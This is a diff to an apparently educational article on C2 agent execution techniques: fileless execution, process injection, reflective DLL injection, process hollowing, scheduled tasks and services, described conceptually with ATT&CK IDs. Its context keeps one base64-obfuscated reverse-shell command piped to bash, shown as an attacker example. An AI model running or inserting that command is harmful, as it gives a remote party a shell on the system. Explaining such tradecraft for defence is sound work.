@@ -223,8 +223,78 @@ While not as complex as PowerShell's ecosystem, attackers still use simple encod
 echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNS80NDQ0IDA+JjEK" | base64 --decode | bash
 ```
 
+<br>
+
+#### In-Memory and Fileless Execution
+
+A defining characteristic of modern C2 agents is the shift towards "fileless" execution, where malicious code is run directly from memory without first being written to the disk. This strategy is a direct response to the effectiveness of traditional antivirus (AV) and endpoint detection and response (EDR) solutions at scanning and flagging malicious files on disk.
+
+Though AV + EDR solutions do perform in-memory scans, the potential impact on system performance is more pronounced, meaning scanning is done much more conservatively, typically only as a response if some suspicion has already been aroused.
+
+Thus by avoiding the file system, "fileless" malware is subject to a lesser degree of scrutiny.
+
+<br>
+
+#### Process Injection (T1055)
+
+Process injection is a family of techniques where an agent injects its code into the memory address space of another, typically legitimate, running process.
+
+Any competent malware author typically selects a process which "makes sense". For example, since the agent typically connects outbound to an external host, choosing `explorer.exe` for example would be much less suspicious than say `calculator.exe`.
+
+Once injected, the malicious code executes under the context of this host process. This serves two primary purposes: it provides a degree of persistence for the malicious code as long as the host process is running, and more importantly, it acts as a powerful defense evasion technique by making the malicious activity appear to originate from a trusted, signed binary.
+
+<br>
+
+**Reflective DLL Injection(T1055.001)**
 
 
+A particularly advanced yet common sub-technique is **Reflective DLL Injection(T1055.001)**. Here the adversary injects a specially crafted Dynamic-Link Library (DLL) that contains malicious code (often shellcode).
+
+Unlike traditional DLL injection, which relies on the Windows `LoadLibrary` API call, a reflective DLL contains its own custom loader. This embedded loader is responsible for manually mapping the DLL into memory, resolving its dependencies, and handling memory relocations. This bypasses security tools that monitor for `LoadLibrary` calls, which is a common detection point for standard injection.
+
+Note that I have created an entire **free course on developing a Reflecting Loader in Golang**, which you can find [here](https://www.faanross.com/firestarter/reflective/moc/).
+
+<br>
+
+**Process Hollowing (T1055.012)**
+
+Another powerful variant is **Process Hollowing (T1055.012)**. Here, the C2 agent initiates a legitimate process (e.g., `notepad.exe`) in a suspended state. It then "hollows out" the process by unmapping its legitimate code from memory and replaces it with the malicious payload. Finally, it resumes the process's main thread, causing the malicious code to execute under the guise of the benign application.
+
+<br>
+
+
+
+
+#### System Services and Scheduled Tasks
+
+C2 agents frequently abuse legitimate operating system features designed for administration and automation to execute their payloads. These methods are particularly effective because they not only provide a means of execution but often confer high privileges and can also be leveraged for persistence.
+
+
+<br>
+
+
+
+**Scheduled Task/Job (T1053)**
+
+An adversary can use the Windows Task Scheduler or the Linux `cron` utility to schedule a payload to run at a specific time or in response to a specific trigger (for example user logon). While this typically viewed as a persistence mechanism, it can also be used for one-time execution of a specific tool or payload.
+
+For example, the [TrickBot](https://malpedia.caad.fkie.fraunhofer.de/details/win.trickbot) malware is well-known for creating scheduled tasks to ensure its continued execution and to launch its various modules.
+
+<br>
+
+
+**System Services (T1569)**
+
+Another effective method combining execution and privilege escalation is the creation or modification of a system service.
+
+On Windows, an agent with administrative rights can use the Service Control Manager (via `sc.exe`) to create a new service that points to its malicious executable. Since many services are configured to start automatically at boot and run with the powerful `NT AUTHORITY\SYSTEM` account, this technique can also lead to privilege escalation. Triple whammy.
+
+<br>
+
+
+
+
+**WORK-IN-PROGRESS**
 
 
 
